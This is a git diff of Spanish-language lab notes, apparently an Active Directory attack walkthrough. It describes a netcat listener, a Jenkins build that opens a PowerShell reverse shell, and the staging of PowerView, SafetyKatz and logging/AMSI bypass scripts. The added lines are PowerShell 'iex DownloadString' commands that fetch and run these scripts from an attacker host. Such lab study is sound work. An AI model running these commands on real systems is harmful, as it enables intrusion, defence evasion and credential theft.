@@ -67,5 +67,18 @@ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
 Ejecutaremos *hsf.exe* y cargaremos *Invoke-PowerShellTcp.ps1*
 Y copiaremos la URL ahora en Jenkins haremos clic en Buid Now descargándose nuestro *PowerShellTcp* en la maquina victima recibiendo así una conexión en nuestro *Netcat* como el usuario *ciadmin*
 
-Ahora transferiremos al servidor HTTP *hsf.exe* programas como *PowerView, Loader, SfetyKatz y sbloggingbypass*
-Y nos descargaremos los archivos
+Ahora transferiremos al servidor HTTP *hsf.exe* programas como *PowerView, Loader, SfetyKatz y sbloggingbypass* además deberemos de pasarnos el fichero *Amsi-Byp.txt*
+
+Y nos descargaremos los archivos en el siguiente orden
+```shell
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
+```
+
+```shell
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
+```
+
+```shell
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
+```
+
